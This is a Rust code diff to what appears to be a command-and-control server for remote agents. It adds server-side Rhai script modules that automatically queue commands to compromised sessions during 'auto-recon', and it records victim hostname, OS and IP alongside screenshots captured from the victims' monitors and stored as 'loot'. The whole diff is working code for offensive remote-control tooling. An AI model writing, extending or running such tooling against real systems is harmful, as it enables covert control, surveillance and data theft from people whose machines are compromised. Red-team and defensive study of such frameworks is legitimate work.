@@ -13,6 +13,7 @@ use tracing::{info, warn, error};
 use std::fs;
 use std::path::Path;
 
+use rhai;
 use crate::common::{ClientHello, Session, SecuredCommand, CommandResponse, SharedSessions, PivotFrame, MalleableProfile};
 use crate::database::{self, DbPool};
 use crate::api::SharedResults;
@@ -386,8 +387,40 @@ pub fn handle_connection(
                 if let Ok(conn) = db_recon.get() {
                     let commands = database::get_auto_recon(&conn);
                     for cmd in commands {
-                        let _ = tx_recon.send((cmd, None));
-                        // Stagger commands slightly
+                        if let Some(module_name) = cmd.strip_prefix("module:") {
+                            // Run a server-side Rhai module, wiring send_c2_command
+                            // to tx_recon so the module's commands reach this session.
+                            let tx_mod  = tx_recon.clone();
+                            let mod_path = format!("./modules/{}.rhai", module_name.trim());
+                            let mod_sess = sess_id;
+                            if let Ok(script) = std::fs::read_to_string(&mod_path) {
+                                let _ = tokio::task::spawn_blocking(move || {
+                                    let mut engine = rhai::Engine::new();
+                                    engine.register_fn("send_c2_command",
+                                        move |_sid: i64, cmd: &str| {
+                                            let _ = tx_mod.send((cmd.to_string(), None));
+                                            "Queued".to_string()
+                                        }
+                                    );
+                                    engine.register_fn("print", |s: &str| {
+                                        tracing::debug!("module: {}", s);
+                                    });
+                                    if let Ok(ast) = engine.compile(&script) {
+                                        let mut scope = rhai::Scope::new();
+                                        let _: Result<rhai::Dynamic, _> = engine
+                                            .call_fn(&mut scope, &ast, "run",
+                                                     (mod_sess as i64,));
+                                    }
+                                }).await;
+                            } else {
+                                warn!(sess_id, module = %module_name,
+                                      "Auto-recon module not found");
+                            }
+                        } else {
+                            // Regular command or ext:load — send directly to agent
+                            let _ = tx_recon.send((cmd, None));
+                        }
+                        // Stagger entries slightly
                         tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                     }
                 }
@@ -631,10 +664,22 @@ async fn process_response(sess_id: u32, r: CommandResponse, results: &SharedResu
             .unwrap_or("")
             .to_string();
         let sess_id_copy = sess_id;
+        // Capture session metadata for the provenance file.
+        // Use the database rather than the sessions map because sessions may
+        // have been moved into a preceding spawn and is not available here.
+        let (snap_hostname, snap_os, snap_ip) = if let Ok(ref conn) = db.get() {
+            conn.query_row(
+                "SELECT hostname, os, ip_address FROM sessions WHERE id = ?1",
+                rusqlite::params![sess_id],
+                |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?, r.get::<_, String>(2)?))
+            ).unwrap_or_default()
+        } else {
+            (String::new(), String::new(), String::new())
+        };
 
         let screenshot_result = tokio::task::spawn_blocking(move || -> Result<(String, usize), String> {
             let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
-            let folder_name = format!("screenshots_{}_{}", timestamp, sess_id_copy);
+            let folder_name = format!("{}_{}_{}", timestamp, sess_id_copy, "screenshot");
             let base_path = Path::new("downloads").join(&folder_name);
             fs::create_dir_all(&base_path).map_err(|e| e.to_string())?;
 
@@ -671,6 +716,23 @@ async fn process_response(sess_id: u32, r: CommandResponse, results: &SharedResu
                     }
                 }
             }
+            // Write provenance metadata matching the convention used by
+            // file_transfer::save_batch_report — same structure the loot
+            // browser renders for downloaded files.
+            let metadata = serde_json::json!({
+                "type":       "screenshot",
+                "session_id": sess_id_copy,
+                "hostname":   snap_hostname,
+                "os":         snap_os,
+                "ip":         snap_ip,
+                "timestamp":  timestamp,
+                "count":      count,
+                "files":      (0..count as u64).map(|i| format!("monitor_{}.png", i)).collect::<Vec<_>>(),
+            });
+            let meta_name = format!("{}_{}_{}_metadata.json", timestamp, sess_id_copy, "screenshot");
+            let _ = fs::write(base_path.join(&meta_name),
+                              serde_json::to_string_pretty(&metadata).unwrap_or_default());
+
             Ok((folder_name, count))
         }).await;
 
